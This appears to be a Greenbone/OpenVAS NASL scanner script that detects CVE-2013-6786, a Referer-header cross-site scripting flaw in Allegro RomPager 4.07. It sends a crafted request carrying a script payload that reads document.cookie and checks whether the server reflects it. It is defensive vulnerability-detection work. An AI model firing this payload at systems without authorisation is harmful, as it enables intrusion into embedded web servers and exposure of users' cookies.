if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.804079" );
	script_version( "2019-11-29T09:25:09+0000" );
	script_cve_id( "CVE-2013-6786" );
	script_bugtraq_id( 63721 );
	script_tag( name: "cvss_base", value: "4.3" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:N/I:P/A:N" );
	script_tag( name: "last_modification", value: "2019-11-29 09:25:09 +0000 (Fri, 29 Nov 2019)" );
	script_tag( name: "creation_date", value: "2014-01-23 12:26:46 +0530 (Thu, 23 Jan 2014)" );
	script_name( "Allegro RomPager HTTP Referer Header Cross Site Scripting Vulnerability" );
	script_tag( name: "summary", value: "This host is installed with Allegro RomPager server and is prone to cross site
  scripting vulnerability." );
	script_tag( name: "vuldetect", value: "Send a crafted data via HTTP GET request and check whether it is able to read
  cookie or not." );
	script_tag( name: "insight", value: "Flaws is due to the application does not validate input passed via the HTTP
  referer header before returning it to the user." );
	script_tag( name: "impact", value: "Successful exploitation will allow attacker to execute arbitrary HTML and
  script code in a user's browser session in the context of an affected site." );
	script_tag( name: "affected", value: "Allegro Software Development Corporation RomPager version 4.07, Other
  versions may also be affected." );
	script_tag( name: "solution", value: "Upgrade to version 4.51 or later." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_xref( name: "URL", value: "http://antoniovazquezblanco.github.io/docs/advisories/Advisory_RomPagerXSS.pdf" );
	script_category( ACT_ATTACK );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_copyright( "Copyright (C) 2014 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "gb_allegro_rompager_detect.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "allegro/rompager/detected" );
	script_xref( name: "URL", value: "http://www.allegrosoft.com/embedded-web-server" );
	exit( 0 );
}
CPE = "cpe:/a:allegrosoft:rompager";
require("http_func.inc.sc");
require("host_details.inc.sc");
require("http_keepalive.inc.sc");
if(!http_port = get_app_port( cpe: CPE )){
	exit( 0 );
}
get_app_location( cpe: CPE, port: http_port );
host = http_host_name( port: http_port );
req = NASLString( "GET /nonexistingdata HTTP/1.1\r\n", "Host: ", host, "\r\n", "Referer: http://test.com/\"><script>alert(document.cookie)</script>\r\n\r\n" );
res = http_keepalive_send_recv( port: http_port, data: req, bodyonly: FALSE );
if(IsMatchRegexp( res, "HTTP/1\\.. 200" ) && ContainsString( res, "<script>alert(document.cookie)</script>" ) && ContainsString( res, "RomPager server" )){
	security_message( port: http_port );
	exit( 0 );
}
exit( 99 );

